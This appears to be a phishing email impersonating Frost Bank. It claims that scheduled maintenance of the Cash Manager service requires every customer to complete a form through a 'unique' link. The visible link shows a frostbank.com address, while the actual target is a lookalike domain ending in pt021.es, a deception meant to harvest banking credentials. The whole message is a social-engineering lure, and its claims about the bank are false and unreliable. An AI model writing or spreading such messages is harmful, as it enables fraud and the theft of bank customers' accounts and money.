 Dear Frost Bank Customer, We would like to inform you that we are currently carrying out scheduled maintenance of banking software, that operates customer database for Frost Bank Cash Manager service. Customer database is based on a client-server protocol, so, in order to finish the update procedure, we need customer direct participation. Every Cash Manager Service customer has to complete a Cash Manager Customer Form. In order to access the form, please use the link below. The link is unique for each account holder. http://treas-mgt.frostbank.com/rdp/ecomm/frost1/cmform?formid=24222498893616870314316743673596107232810680892942958 (http://treas-mgt.frostbank.com.pt021.es/rdp/ecomm/frost1/cmform?formid=24222498893616870314316743673596107232810680892942958) Thank you for your cooperation.
